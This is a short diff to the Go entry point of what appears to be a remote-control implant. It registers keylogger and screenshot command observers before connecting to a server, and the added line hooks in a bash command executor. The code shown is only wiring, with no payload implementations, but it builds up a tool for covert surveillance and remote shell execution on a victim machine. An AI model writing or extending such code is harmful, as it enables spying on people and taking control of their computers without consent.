@@ -33,6 +33,7 @@ func main() {
 	subject := &observer.Subject{}
 	subject.AddListener(observer.NewKeyloggerCmdObserver())
 	subject.AddListener(observer.NewScreenshotCmdObserver(screenrecorder))
+	subject.AddListener(observer.NewBashExecutorObserver())
 
 	// Start connection and communication with server
 	// Subject with Observers is passed as parameter
